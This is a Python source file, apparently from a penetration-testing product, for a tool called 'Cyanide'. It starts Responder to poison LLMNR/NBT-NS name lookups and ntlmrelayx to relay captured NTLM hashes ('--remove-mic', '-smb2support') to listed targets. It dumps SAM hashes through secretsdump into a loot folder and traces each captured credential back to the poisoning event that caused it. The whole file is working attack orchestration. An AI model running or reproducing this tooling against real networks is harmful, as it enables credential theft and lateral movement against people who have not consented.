import argparse
import queue
import sys
import signal
import os
import json
import logging
import sqlite3
from datetime import datetime, timezone
from horizon3_impacket.examples.ntlmrelayx import main as ntlmrelay_main
from responder.Responder import main as responder_main
from multiprocessing import Process, Queue
import cyanide_schema as S
#if os.path.exists('/opt/h3/'):
#    logfile = '/opt/h3/cyanide.log'
#else:
#    logfile = 'cyanide.log'
#
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
## now create a filehandler
#logFormatter = logging.Formatter("%(asctime)s - %(levelname)s - %(name)s - %(funcName)s() - %(message)s")
#fileHandler = logging.FileHandler(logfile)
#fileHandler.setFormatter(logFormatter)
#logger.addHandler(fileHandler)

#fmter = logging.Formatter('%(asctime)s - %(funcName)s - %(levelname)s - %(message)s')
#console_handler = logging.StreamHandler()
#console_handler.setFormatter(fmter)
#logger.addHandler(console_handler)

class Cyanide:
    """
    Instantiates all poisoning classes and handles data flow.
    """
    CACHE_DATABASE = 'poisoner_cache.db'
    PRODUCTION_DATABASE = 'poisoner_prod.db'
    RELAY_DATABASE = 'poisoner_relay.db'
    # maps will have ability to be shared - need to be here
    QUEUE_MAP = {}
    PROC_MAP = {}
    PARSER_MAP = {}

    def __init__(self, config: argparse.Namespace):
        # set self.poison static for now; ntlmrelayx will always need to be started
        # if relay is not wanted, simply leave the ntlmrelayx_targets file empty and will act just like responder
        # captured_hashes and will still be captured
        self.poison = True
        self.terminate_cyanide = False
        self.config = config
        self.output_file = self.config.output_file
        # all tools share this queue
        self.poisoner_q = Queue()

    def _setup_cache_database(self):
        """
        Setup the cache database to store poison messages received from tools like Responder
        :return: None
        """
        if os.path.exists(Cyanide.CACHE_DATABASE):
            logger.debug(f'{Cyanide.CACHE_DATABASE} present already')
            # should be present if restarted process
            return

        else:
            conn = sqlite3.connect(Cyanide.CACHE_DATABASE)
            try:
                logger.debug(f'Setting up cache database..')
                cursor = conn.cursor()
                cursor.execute(
                    'CREATE TABLE poisoner_cache (timestamp INTEGER, action_state TEXT, msg TEXT)')
                conn.commit()
                cursor.execute(
                    'CREATE TABLE ntlmrelayx_msg (timestamp INTEGER, action_state TEXT, msg TEXT)')
                conn.commit()
                cursor.close()

            except Exception as e:
                sys.stderr.write(f'_setup_cache_database encountered and error {type(e)}: {e}\n')

            finally:
                conn.close()

    def _setup_production_database(self):
        """
        Setup the production database used to store final results and dump to file every 30 seconds
        :return: None
        """
        if os.path.exists(Cyanide.PRODUCTION_DATABASE):
            logger.debug(f'{Cyanide.PRODUCTION_DATABASE} present already')
            return

        conn = sqlite3.connect(Cyanide.PRODUCTION_DATABASE)
        try:
            logger.debug(f'Setting up production database')
            cursor = conn.cursor()
            cursor.execute(
                'CREATE TABLE production_db (id INTEGER PRIMARY KEY AUTOINCREMENT, msg TEXT)'
            )
            conn.commit()
            cursor.close()

        except Exception as e:
            sys.stderr.write(f'_setup_production_database encountered {type(e)}: {e}\n')

        finally:
            conn.close()

    def _setup_relay_database(self):
        """
        Setup the relay database to keep track of captured hashes used in relay attacks.  Secretsdump messages
        will contain the same correlation id and will will this database to correlate the return final message.
        :return:
        """
        if os.path.exists(Cyanide.RELAY_DATABASE):
            logger.debug(f'{Cyanide.RELAY_DATABASE} present already')
            return

        conn = sqlite3.connect(Cyanide.RELAY_DATABASE)
        try:
            logger.debug(f'Setting up relay database')
            cursor = conn.cursor()
            cursor.execute(
                'CREATE TABLE used_hash_captures (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp INTEGER, msg TEXT)'
            )
            conn.commit()
            cursor.close()

        except Exception as e:
            sys.stderr.write(f'_setup_relay_database encountered {type(e)}: {e}\n')

        finally:
            conn.close()

    def run_poisoner(self):
        """
        Starts the enabled servers and then enters a while loop to watch msg queue and also keeps process alive
        :return: None
        """
        self._setup_cache_database()
        self._setup_production_database()
        self._setup_relay_database()

        if self.poison:
            self.run_ntlmrelayx()
        if self.config.responder:
            self.run_responder()
        #if self.config.scf:
        #    self.tool_instances.append(CyanideSCF(config=self.config))

        # will keep main process alive
        # queue and process checker
        dump_prod_db_timer = datetime.now(timezone.utc).timestamp()
        poisoner = None
        while not self.terminate_cyanide:
            # check for any processes that may have accidentally died
            #print(f'main terminate_cyanide? {self.terminate_cyanide}')
            for p in Cyanide.PROC_MAP.values():
                if not p.is_alive() and not self.terminate_cyanide:
                    tool_name = p.name
                    sys.stderr.write(f'{tool_name} died unexpectedly\n')
                    self.kill_proc_and_restart(tool_name)

            kill = False
            try:
                msg = self.poisoner_q.get(timeout=4)
                poisoner = msg.get('poisoner')
                logger.debug(f'Message was from {poisoner}')
                if msg.get('action_state') == 'error':
                    logger.debug(f'{poisoner} process received stderr')
                    kill = True
                else:
                    Cyanide.PARSER_MAP[poisoner](self.config).parse_output(msg)

                if kill and poisoner:
                    logger.debug(f'Had processes to kill')
                    self.kill_proc_and_restart(poisoner)

            except queue.Empty:
                pass

            except Exception as ex:
                # if the proc did die and comms destroyed, will be caught at beginning of loop
                sys.stderr.write(f'Encountered an error processing the queue. {ex}\n')

            # check if we need to dump prod db contents
            prod_conn = None
            relay_conn = None
            try:
                prod_conn = sqlite3.connect(Cyanide.PRODUCTION_DATABASE)
                timenow = datetime.now().timestamp()
                if timenow - dump_prod_db_timer >= 30 and poisoner:
                    try:
                        relay_conn = sqlite3.connect(Cyanide.RELAY_DATABASE)
                        logger.debug(f'dumping relay db')
                        Cyanide.PARSER_MAP['ntlmrelayx'](self.config)._relay_age_handler(relay_conn, prod_conn, age=30)
                    except Exception as e:
                        sys.stderr.write(
                            f'run_poisoner encountered an error creating relay database connection {type(e)}: {e}\n')
                    self.dump_prod_db_to_file(prod_conn)
                    dump_prod_db_timer = datetime.now(timezone.utc).timestamp()

            except Exception as e:
                sys.stderr.write(f'cyanide main loop encountered an error {type(e)}: {e}\n')

            finally:
                if prod_conn:
                    prod_conn.close()
                if relay_conn:
                    relay_conn.close()


    def run_ntlmrelayx(self):
        """
        Will (re)start ntlmrelayx.
        :return:
        """
        logger.debug(f'Starting ntlmrelayx..')
        tool_name = 'ntlmrelayx'
        Cyanide.PARSER_MAP['ntlmrelayx'] = CyanideNTLMRelayxParser
        self._start_proc(tool_name)

    def run_responder(self):
        """
        Will (re)start responder.
        :return: None
        """
        logger.debug(f'Starting responder..')
        tool_name = 'responder'
        Cyanide.PARSER_MAP['responder'] = CyanideResponderParser
        self._start_proc(tool_name)

    def _start_proc(self, tool_name):
        """
        Will start a given tool by its run method
        :param tool_name: Cyanide tool to start
        :return: None
        """
        func = 'start_'+tool_name
        func = getattr(self, func)
        proc = Process(name=tool_name, target=func)
        Cyanide.PROC_MAP[tool_name] = proc
        proc.daemon = True
        proc.start()
        logger.debug(f'{tool_name} started.')

    def start_ntlmrelayx(self):
        """
        Function passed into Process function in order to create the subprocess
        :return:
        """
        ntlmrelayx_raw_args = f'-tf {self.config.ntlmrelayx_targets_file} -l {self.config.loot} -smb2support --no-acl --no-da --remove-mic --no-wcf-server'
        ntlmrelayx_raw_args = ntlmrelayx_raw_args.split()
        try:
            ntlmrelay_main(raw_args=ntlmrelayx_raw_args, tool_q=self.poisoner_q)

        except Exception as e:
            sys.stderr.write(f'start_ntlmrelayx failed to start due to {type(e)}: {e}\n')

    def start_responder(self):
        """
        Function passed into Process function in order to create the subprocess
        :return:
        """
        responder_raw_args = f'-I {self.config.iface}'
        responder_raw_args = responder_raw_args.split()
        try:
            responder_main(raw_args=responder_raw_args, responder_blacklist=self.config.responder_blacklist,
                           responder_scope=self.config.responder_scope, tool_q=self.poisoner_q)
        except Exception as e:
            raise Exception(f'Responder failed to start - {type(e)}: {e}')

    def restart_poisoner(self, proc_name):
        """
        Will take a tool name (passed in via proc_name) and will dynamically restart it based on the name.
        :param proc_name: str : name of a tool that needs to be restarted due to an error msg
        :return: None
        """
        func = 'run_' + proc_name
        # instantiate the desired tools run_<tool> function dynamically
        logger.debug(f'{proc_name} is restarting..')
        getattr(self, func)()

    def kill_proc_and_restart(self, tool_name):
        """
        Main function to start killing a process and restart it
        :param tool_name: str : name of the tool to restart
        :return: None
        """
        try:
            proc = Cyanide.PROC_MAP[tool_name]
            logger.debug(f'Killing {proc.name}')
            proc.kill()
            # use join to wait until process is finished before restarting
            logger.debug(f'Joining {proc.name} and waiting til graceful exit')
            proc.join()
            self.restart_poisoner(proc.name)
            # process matched and was killed, return

        except Exception as e:
            sys.stderr.write(f'kill_proc_and_restart errored {type(e)}: {e}\n')

    def _production_database_generator(self, conn):
        """
        Iterate over current production database contents and yield each row
        :return: tuple : (index, msg)
        """
        try:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM production_db')
            for msg in cursor.fetchall():
                yield msg

        except Exception as e:
            sys.stderr.write(f'_production_database_generator encountered an error {type(e)}: {e}\n')

    def _delete_prod_db_row(self, idx: int, conn: sqlite3.connect):
        """
        Delete a row from the production database
        :param idx: str : index number of the row to delete
        :return: None
        """
        try:
            cursor = conn.cursor()
            logger.debug(f'Delete index {idx} from database')
            cursor.execute(f'DELETE from production_db WHERE id = {idx}')
            conn.commit()

        except Exception as e:
            sys.stderr.write(f'_delete_prod_db_row encountered an error {type(e)}: {e}\n')

    def dump_prod_db_to_file(self, conn: sqlite3.connect, append: bool = False):
        """
        Writes current production database to an output file.  Typically ran every 30 seconeds
        :return: None
        """
        if os.path.exists(self.output_file) and not append:
            try:
                os.remove(self.output_file)

            except Exception as e:
                sys.stderr.write(f'dump_prod_db_to_file encountered an error removing {self.output_file}. {type(e)}: {e}')

        db_dump_contents = []
        ids_to_delete = []
        try:
            with open(self.output_file, 'w+') as outfile:
                # iterate over db generator
                for msg in self._production_database_generator(conn):
                    msg_to_input = json.loads(msg[1])
                    #logger.debug(f'Writing {msg_to_input} from db to {self.output_file}')
                    db_dump_contents.append(msg_to_input)
                    ids_to_delete.append(msg[0])
                outfile.write(S.CyanideEventSchema().dumps(db_dump_contents, many=True))

            for id in ids_to_delete:
                self._delete_prod_db_row(id, conn)

        except Exception as e:
            sys.stderr.write(f'dump_prod_db_to_file encountered an error {type(e)}: {e}\n')

class ToolInterface:
    """
        Responder can also capture hashes from sources besides SMB.  SMB will be sent to ntlmrelayx.  Other services
        include:
        HTTP, LDAP, SQL, SMB, RDP, Kerberos, FTP, POP, SMTP, IMAP, HTTP/S, LDAP, DCERPC, WINRM

        Ntlmrelayx will correlate the received msg to responder and determine the source and output all data as
        json into an output file
    """

    def __init__(self, config: argparse.Namespace):
        self.config = config

    def _get_timestamps(self, msg: dict):
        timestamps_list = []
        logger.debug(f'Getting timestamps list from cache..')
        timestamps_list = self._check_cache(timestamps_list, msg)

        logger.debug(f'Returning {len(timestamps_list)} timestamps')
        return timestamps_list

    def _get_source(self, msg: dict):
        timestamps_list = self._get_timestamps(msg)
        if not timestamps_list:
            # typically happens after a host has cached poison and cyanide restarts
            #sys.stderr.write(f'Must have been a restart. Message source was not found.\n')
            return

        logger.debug(f'Getting final source from list of poisoner output within acceptable timeframe')
        poison_source_msg = self._find_final_source(msg, timestamps_list)

        return poison_source_msg

    def _find_final_source(self, orig_msg: dict, timestamps: list):
        """
        Compare all messages that met the > 0 < 2 second criteria to find the closest one
        :return: dict : msg ( closest to ntlmrelayx timestamp )
        """
        logger.debug(f'Finding final source of poison..')
        return min(timestamps, key=lambda x: abs(x['timestamp'] - orig_msg['timestamp']))

    def _compare_timestamps(self, tool_output, poisoner_output, time_diff=None):
        """
        Will compare timestamps of ntlmrelayx output to already gathered information from poisoning tools
        If the poisoner_output is coming from the database, its a best guess to determine the source that is based on
        time.
        :param tool_output: dict : received msg from ntlmrelayx or responder captured hash
        :param poisoner_output: dict : message from poisoner_output() generator
        :param time_diff: int : specified amount of time allowed from ntlmrelayx_ouptut (e.g. db is 5 mins, realtime 4 sec)
        :return: close_timestamps : list - close_timestamp list for final comparison
        """
        ntlmrelayx = False
        if tool_output['poisoner'] == 'ntlmrelayx':
            ntlmrelayx = True
        #logger.debug(f'_compare_timestamps entered')
        tool_timestamp = tool_output['timestamp']
        poisoner_timestamp = poisoner_output['timestamp']
        cur_diff = tool_timestamp - poisoner_timestamp
        if 0 < cur_diff < time_diff:
            # make sure the source_host in ntlmrelayx matches the poisoner target
            # e.g. responder poisoned an smb request to 10.0.0.8, then 10.0.0.8 connected to our smbserver and captured the hash, that hash is then relayed to our hosts
            # in the ntlmrelayx_target_file.  poisoner_output['target'] would be 10.0.0.8 and
            # ntlmrelayx['data']['source_host'] would be 10.0.0.8 (target_host is the host relayed to)
            if ntlmrelayx:
                if tool_output['data']['source_host'] == poisoner_output['target']:
                    return poisoner_output
            else:
                if tool_output['target'] == poisoner_output['target']:
                    return poisoner_output

    def _check_cache(self, timestamps_list: list, msg: dict):
        try:
            conn = sqlite3.connect(Cyanide.CACHE_DATABASE)

        except Exception as e:
            sys.stderr.write(f'_check_cache encountered an error setting up cache db conneciton {type(e)}: {e}\n')
            return

        logger.debug('Checking cache...')
        try:
            for output_cache in self.poisoner_cache_output(conn):
                output = json.loads(output_cache)
                msg_in_range = self._compare_timestamps(msg, output, time_diff=600)
                if msg_in_range:
                    timestamps_list.append(msg_in_range)
            logger.debug(f'Done checking cache.')
            return timestamps_list

        except Exception as e:
            sys.stderr.write(f'_check_cache encountered an error {type(e)}: {e}\n')

        finally:
            conn.close()

    def relay_db_output(self, conn):
        """
        Generator to retrieve current relay db contents to match correlation ids to
        :return: generator : row in db
        """
        try:
            cursor = conn.cursor()
            cursor.execute('SELECT * from used_hash_captures')
            logger.debug(f'Iterating over relay db rows')
            for row in cursor.fetchall():
                yield row

        except Exception as e:
            sys.stderr.write(f'relay_db_output encountered an error {type(e)}: {e}\n')

    def poisoner_cache_output(self, conn):
        """
        Iterate over the poisoners cache database and yield each row
        :return: Generator of previous messages from enabled poisoners
        """
        try:
            cursor = conn.cursor()
            cursor.execute('SELECT msg from poisoner_cache')
            logger.debug(f'Iterating over cache db rows')
            for row in cursor.fetchall():
                yield row[0]

        except Exception as e:
            sys.stderr.write(f'poisoner_cache_output encountered an error {type(e)}: {e}\n')

    def _cache_age_handler(self, cursor, conn):
        try:
            timenow = datetime.now(timezone.utc).timestamp()
            # determine 10 minutes ago
            # uncertain how long llmnr/nbtns poisoning is cached - setting to 10 minutes as in testing
            # have not noticed any non-matched sources.  Fairly safe to assume that the last poison msg sent to that
            # source host of captured hash is the reason it reached out to us
            time_hack = timenow - 600
            cmd = f'DELETE FROM poisoner_cache WHERE timestamp < {time_hack}'
            cursor.execute(cmd)
            conn.commit()

        except Exception as e:
            sys.stderr.write(f'_cache_age_handler encountered an error {type(e)}: {e}\n')

    def _insert_cache_msg_into_db(self, cursor, msg, conn):
        try:
            cursor.execute("INSERT INTO poisoner_cache VALUES(?, ?, ?)", (msg['timestamp'], msg['action_state'], json.dumps(msg)))
            conn.commit()

        except Exception as e:
            sys.stderr.write(f'_insert_cache_msg_into_db encountered an error {type(e)}: {e}\nmsg: {json.dumps(msg)}\n')

    def cache_handler(self, conn: sqlite3.connect, msg: dict = None, ntlmrelayx_msg: dict = None):
        """
        Handles a database on n0 that will keep a historical record of the last x minutes of messages received from
        poisoners (e.g. responder).
        :param: msg : dict - incoming message from poisoner
        :return: None
        """
        try:
            cursor = conn.cursor()
            # here iterate over db in sep func to check time > 10 minutes and discard
            self._cache_age_handler(cursor, conn)
            # here process current message into db in sep func
            if ntlmrelayx_msg:
                msg = ntlmrelayx_msg
            self._insert_cache_msg_into_db(cursor, msg, conn)
            cursor.close()

        except Exception as e:
            sys.stderr.write(f'cache_handler encountered an error {type(e)}: {e}\nmsg: {json.dumps(msg)}\n')

    def _insert_msg_into_db(self, cursor: sqlite3.Cursor, query: tuple):
        """
        Helper function to execute command
        :param cursor: sqlitedb cursor instance
        :param query: str : query to be executed
        :return:
        """
        try:
            logger.debug(f'_insert_msg_into_db entered')
            cursor.execute(query[0], query[1])
            logger.debug(f'_insert_msg_into_db done')

        except Exception as e:
            sys.stderr.write(f'_insert_msg_into_db encountered an error {type(e)}: {e}\nquery: {query}\n')

        finally:
            cursor.close()

    def relay_db_handler(self, query: tuple, conn: sqlite3.connect):
        """
        Handles inserting messages into the relay db
        :param query: Insert query string to use
        :param conn: database connection
        :return: None
        """
        try:
            cursor = conn.cursor()
            logger.debug(f'Inserting msg containing hash used in relay into relay db')
            self._insert_msg_into_db(cursor, query)
            conn.commit()

        except Exception as e:
            sys.stderr.write(f'relay_db_handler encountered an error {type(e)}: {e}\n')

    def _delete_old_relay_db_msgs(self, cursor, query):
        try:
            cursor.execute(query)

        except Exception as e:
            sys.stderr.write(f'_delete_old_relay_db_msgs encountered an error {type(e)}: {e}\n')

    def _relay_age_handler(self, relay_conn: sqlite3.connect, prod_conn: sqlite3.connect, age: int = None):
        try:
            relay_cursor = relay_conn.cursor()
            prod_cursor = prod_conn.cursor()
            timenow = datetime.now(timezone.utc).timestamp()
            if age:
                # grab captured_hash msgs older than x time ago
                time_hack = timenow - age
                cmd = f'select * from used_hash_captures WHERE timestamp < %d' % time_hack
            else:
                cmd = f'select * from used_hash_captures'
            old_ntlmrelay_captures_generator = relay_cursor.execute(cmd)
            for row in old_ntlmrelay_captures_generator:
                index = row[0]
                msg = json.loads(row[2]) # is str from db - needed to strip corr_id off
                relay_db_query = 'DELETE from used_hash_captures where id=%d' % index
                # strip corr_id off prior to sending to up to adhere to schema
                msg = self._clean_final_msg_before_db_input(msg)
                # delete from relay_db
                self._delete_old_relay_db_msgs(relay_cursor, relay_db_query)
                logger.debug(f'_delete_old_relay_db_msgs deleted {index} from relay_db')
                msg = json.dumps(msg)
                prod_query = "INSERT INTO production_db (msg) VALUES (?)", (msg,)
                self._insert_msg_into_db(prod_cursor, prod_query)
                logger.debug(f'_relay_age_handler inserted msg {msg} from index {index} into production_db')
                relay_conn.commit()
                prod_conn.commit()

        except Exception as e:
            sys.stderr.write(f'_relay_age_handler encountered an error {type(e)}: {e}\n')

    def _clean_final_msg_before_db_input(self, msg: dict):
        if msg['data'].get('corr_id'):
            del msg['data']['corr_id']
        if msg['data'].get('sam_hash_filename'):
            del msg['data']['sam_hash_filename']

        return msg

    def production_db_handler(self, query: tuple, conn: sqlite3.connect):
        """
        Insert a msg into the production db
        :param query: str : query to execute
        :return: None
        """
        try:
            cursor = conn.cursor()
            self._insert_msg_into_db(cursor, query)
            logger.debug(f'inserted msg into production db')
            conn.commit()

        except Exception as e:
            sys.stderr.write(f'production_db_handler encountered an error {type(e)}: {e}\nquery: {query}\n')

    def delete_msg_from_relay_db(self, id: int, conn: sqlite3.connect):
        """
        Delete a message that was paired with ntlmrelayx secretsdump message from the prod db
        :param id: int
        :return: None
        """
        try:
            cursor = conn.cursor()
            logger.debug(f'Deleting message from relay db with id {id}')
            query = 'DELETE from used_hash_captures where id=%d' % id
            cursor.execute(query)
            conn.commit()
            cursor.close()

        except Exception as e:
            sys.stderr.write(f'delete_msg_from_relay_db encountered an error {type(e)}: {e}\nid {id}\nid type: {type(id)}\n')

    def _process_captured_message(self, msg: dict):
        """
        Package up the msg into an output for Core to process
        :param msg: Dict : contains poisoned information about how the hash was obtained
        :return: None
        """
        try:
            conn = sqlite3.connect(Cyanide.PRODUCTION_DATABASE)

        except Exception as e:
            sys.stderr.write(f'responder parse_response encountered an error creating production database connection {type(e)}: {e}\n')
            return

        try:
            if not self.config.loot_only:
                if msg.get("target") == '127.0.0.1':
                    # failsafe in case something is missed in smb/http relayserver.py's
                    return
                poison_source_msg = self._get_source(msg)
                if not poison_source_msg:
                    #sys.stderr.write(f'No poisoner source was found for has captured from {msg.get("target")}\n')
                    return

                msg['poison_source'] = poison_source_msg
                msg = self._clean_final_msg_before_db_input(msg)
                query = "INSERT INTO production_db (msg) VALUES (?)", (json.dumps(msg),)
                logger.debug(f'inserting captured hash from {msg["poisoner"]} to database.\nMessage: {msg}')
                self.production_db_handler(query, conn)
            else:
                print(json.dumps(msg, indent=4))

        except Exception as e:
            sys.stderr.write(f'ToolInterface process_captured_message encountered an error {type(e)}: {e}\n')

        finally:
            conn.close()

class CyanideResponderParser(ToolInterface):

    def __init__(self, config: argparse.Namespace):
        self.no_db_states = ['enabled_servers', 'captured_hash', 'captured_cleartext']
        self.responder_enabled_servers = None
        super().__init__(config)

    def parse_output(self, msg: dict):
        """
        Receives messages from the responder module and processes according the action_state value of the msg
        :param msg: dict : information pertaining to an action that Responder module has taken
        :return: None
        """
        logger.debug(f'msg: {msg}')
        try:
            conn = sqlite3.connect(Cyanide.CACHE_DATABASE)

        except Exception as e:
            sys.stderr.write(f'responder parse_output encountered an error creating cache database connection {type(e)}: {e}\n')
            return

        try:
            if not msg.get('action_state'):
                sys.stderr.write(f'MSG did not contain an action! {msg}\n')

            elif not msg.get('action_state') in self.no_db_states:
                logger.debug(f'Poison message received, adding to cache db')
                self.cache_handler(conn, msg=msg)

            elif msg.get('action_state') == 'enabled_servers':
                # handle storing responders enabled servers ids
                #TODO add ability to change servers between responder and ntlmrelayx dynamically
                logger.debug(f'Tracking servers started by responder')
                self.responder_enabled_servers = msg.get('data')

            else:
                # should only leave captured_cleartext actions
                logger.debug(f'Sending {msg} to process captured message')
                self._process_captured_message(msg)

        except Exception as e:
            sys.stderr.write(f'responder parse_output encountered an error {type(e)}: {e}\n')

        finally:
            conn.close()

class CyanideNTLMRelayxParser(ToolInterface):

    def __init__(self, config: argparse.Namespace):
        self._close_timestamp_msgs = []
        # deprecated
        #self._prev_sd_file = 'prev_secretsdump.txt'
        super().__init__(config)

    def _find_msg_corr_id(self, msg: dict):
        """
        Ntlmrelayx messages that are not a secretsdump already find the poison source and get put in production database
        We need to take secretsdump messages and match correrlation ids to find the hash used to secretsdump and
        pair it with the poison_source
        :param msg: dict
        :return: generator of id (to delete matched messages already in db) and output hash (to combine to final msg)
        """
        logger.debug(f'checking corr_id that matches {msg["data"].get("corr_id")}...')
        try:
            conn = sqlite3.connect(Cyanide.RELAY_DATABASE)

        except Exception as e:
            sys.stderr.write(f'ntlmrelayx parser _find_msg_corr_id encountered an error creating cache database connection {type(e)}: {e}\n')
            return

        try:
            for id, timestamp, output in self.relay_db_output(conn):
                output = json.loads(output)
                corr_id = output['data'].get('corr_id')
                if corr_id and corr_id == msg['data'].get('corr_id'):
                    # id will be used to delete out of perm db later
                    logger.debug(f'{corr_id} found a match')
                    #print(f'_find_msg_corr_id corr_id {corr_id} found a match')
                    return id, output

            logger.debug(f'{msg["data"].get("corr_id")} did not find a match')
            return None, None

        except Exception as e:
            sys.stderr.write(f'Failed to retrieved poisoner_db_output() due to: {type(e)}: {e}\n')

        finally:
            conn.close()

        return None, None

    def parse_output(self, msg: dict):
        """
        Handles the messages received from ntlmrelayx.
        :param msg: dict : Message from ntlmrelayx output
        :return: None
        """
        if not msg['user']:
            logger.debug(f'msg contained guest account user captured on accident, dropping msg and returning')
            return
        try:
            conn = sqlite3.connect(Cyanide.PRODUCTION_DATABASE)

        except Exception as e:
            sys.stderr.write(f'ntlmrelayx parse_output encountered an error creating production database connection {type(e)}: {e}\n')
            return

        try:
            relay_conn = sqlite3.connect(Cyanide.RELAY_DATABASE)

        except Exception as e:
            sys.stderr.write(f'ntlmrelayx parse_output encountered an error creating relay databse connection {type(e)}: {e}\n')
            return

        try:

            db_msg = None
            action_state = msg['action_state']
            logger.debug(f'Getting list of close timestamp messages from _get_source()')
            poisoner_source_msg = self._get_source(msg)

            if msg.get("target") == '127.0.0.1':
                # failsafe in case something is missed in smb/http relayserver.py's
                return
            if not poisoner_source_msg:
                #sys.stderr.write(f'No poisoner source was discovered for hash captured from {msg.get("target")}\n')
                return

            msg['poison_source'] = poisoner_source_msg
            if action_state == 'captured_hash':
                logger.debug(f'ntlmrelayx parse_output inserting captured_hash to relay database\nMessage: {msg}')
                if not self.config.loot_only:
                    if self.config.no_relay:
                        self._process_captured_message(msg)

                    else:
                        query = "INSERT INTO used_hash_captures (timestamp, msg) VALUES (?, ?)", (msg['timestamp'], json.dumps(msg))
                        self.relay_db_handler(query, relay_conn)

                    # no need to continue - just need this msg to go into the db
                    return

                else:
                    print(json.dumps(msg, indent=4))

            elif action_state == 'secretsdump' or action_state == 'secretsdump_fail':
                # grab the output file contents
                if action_state == 'secretsdump':
                    with open(msg['data']['sam_hash_filename'], 'r') as dumpfile:
                        logger.debug(f'Reading secretsdump file...')
                        secretsdump_contents = dumpfile.read()
                    msg['data']['secretsdump_hashes'] = secretsdump_contents.strip()
                    logger.debug(f'Added successful secretsdump to msg')

                logger.debug(f'secretsdump msg received: {msg}')
                # get the hash used and id of the msg in relay db to delete
                # this msg should exist since the db purge does not happen until after this finishes and all prev
                # ntlmrelayx messages in the last 30 seconds should be present
                try:
                    id, db_msg = self._find_msg_corr_id(msg)
                    if id:
                        self.delete_msg_from_relay_db(id, relay_conn)
                    else:
                        sys.stderr.write(f'No id was found from _find_msg_corr_id\n')
                        return

                except Exception as e:
                    sys.stderr.write(f'ntlmrelayx _find_msg_corr_id failed retrieving db_msg. {type(e)}: {e}\n')

            if db_msg:
                # only need to get the fullhash and type from the db_msg to track what hash did the dump
                msg['data']['fullhash'] = db_msg['data'].get('fullhash')
                msg['data']['type'] = db_msg['data'].get('type')

            logger.debug(f'Final message {msg}')

            if msg:
                if not self.config.loot_only:
                    # remove corr_id from all data keys
                    msg = self._clean_final_msg_before_db_input(msg)
                    msg = json.dumps(msg)
                    logger.debug(f'inserting {action_state} information into production db.\n{msg}\n')
                    query = "INSERT INTO production_db (msg) VALUES (?)", (msg,)
                    self.production_db_handler(query, conn)

                else:
                    print(json.dumps(msg, indent=4))

            else:
                logger.debug(f'Message of {msg} has been discarded.\n')

        except Exception as e:
            sys.stderr.write(f'ntlmrelayx parse_output encountered an error {type(e)}: {e}\nmsg: {msg}\n')

        finally:
            conn.close()
            relay_conn.close()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(add_help=False, description="This tool will start listeners and determine the source of poisoning and format its outputs to a format for core to process")
    parser._optionals.title = "Main Tool Arguments"

    # Main arguments for Cyanide
    parser.add_argument('-h', '--help', action='help', help='Show all options')
    parser.add_argument('-iface', '--iface', action='store', metavar='INTERFACE', help='Host interface for services to bind to')
    parser.add_argument("-w", "--watch", action='store_true', help="Enable watching files for updates")
    parser.add_argument('-loot', '--loot-only', action='store_true', help='Store all information gathered in a sqlite database', default=False)
    parser.add_argument('-o', '--output_file', help='Output file to be used to write contents of production db to file', required=False)

    # responder options
    responderoptions = parser.add_argument_group()
    responderoptions.add_argument('--responder', action='store_true', help='Enable responder')
    responderoptions.add_argument('-rb', '--responder-blacklist', help='Blacklist of IP addresses not to interact with')
    responderoptions.add_argument('-rs', '--responder-scope', help='Whitelist scope of IP addresses to interact with')

    # ntlmrelayx options
    ntlmrelayxoptions = parser.add_argument_group()
    ntlmrelayxoptions.add_argument('-ntf', '--ntlmrelayx-targets-file', help='Targets file to be used with ntlmrelayx', required=True)
    ntlmrelayxoptions.add_argument('-l', '--loot', help='Loot directory to place loot from ntlmrelayx', default='loot')
    ntlmrelayxoptions.add_argument('--zone', help='DNS Zone to append to fake wpad file')
    ntlmrelayxoptions.add_argument("--no-relay", action='store_true', help="Do not relay captured hashes. This is needed in order to still log the hashes captured via SMB")


    try:
        options = parser.parse_args()
        if options.responder and not options.responder_blacklist:
            sys.stderr.write(f'A blacklist for Responder is required when Responder is enabled.  Use -rb and specify a comma separated list of ip address or network ranges (e.g. 10.0.8.1 or 10.0.8.0-255 format\n')

        else:
            cyanide = Cyanide(options)
            cyanide.run_poisoner()

    except Exception as e:
        sys.stderr.write(f'Cyanide encountered an error: {type(e)}: {str(e)}\n')
        raise

